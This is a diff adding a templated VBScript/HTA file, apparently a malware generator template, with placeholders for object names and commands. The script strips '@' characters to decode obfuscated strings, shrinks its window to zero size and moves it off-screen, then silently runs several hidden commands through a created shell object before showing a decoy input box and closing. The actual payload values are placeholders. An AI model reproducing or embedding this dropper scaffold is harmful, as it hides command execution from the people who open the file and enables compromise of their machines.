@@ -1,0 +1,20 @@
+
+
+function %var1%(%var2%) 
+%var1% = Replace(%var2%, chr(64), "")
+end function
+
+window.resizeTo 0, 0
+ window.moveTo Int(window.screen.width + 451 ), Int( window.screen.height + 139 )
+CreateObject (%var1%("%const2%")).run %var1%("%const4%"),2,TRUE
+
+CreateObject (%var1%("%const2%")).run %var1%("%const13%"),2,TRUE
+
+CreateObject (%var1%("%const2%")).run %var1%("%const14%"),2,TRUE
+
+CreateObject(%var1%("%const2%")).Run %var1%("%const7%"),2,TRUE
+
+InputBox %var1%("%const8%"),%var1%("%const8%"),%var1%("%const9%") 
+
+window.Close 
+
